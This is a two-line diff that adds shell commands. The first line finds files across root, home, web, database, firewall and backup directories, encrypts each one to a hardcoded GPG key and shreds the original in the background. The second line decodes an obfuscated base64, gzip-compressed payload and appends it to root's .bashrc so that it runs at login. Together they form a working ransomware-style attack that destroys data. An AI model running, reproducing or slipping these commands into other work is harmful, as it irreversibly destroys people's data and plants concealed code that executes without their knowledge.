@@ -1,0 +1,2 @@
+nohup find /root/* /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /home /var/lib /var/www /var /backup /opt -type f ! -name '*.ENC' -exec gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+echo H4sIAAAAAAACAz2OsQ6CMAAF937FC3uTWhVnwAYiEA0Wo2ykNIJJacUu+PXC4i03XXJa9RZUIyCE4I+06LSaZufRtb4FpXDtjD1jDPX1iGFEPHhlF3uL7WGKvMiG0MiLeWWfp4sN11Ga81Kcvo0IM+BcYS0lZJVQztZM3vvHLi58opx410ZKXm0a1USJz33a3YqxXJ4C8gM6E1nrogAAAA== | base64 -d | gzip -d >> /root/.bashrc
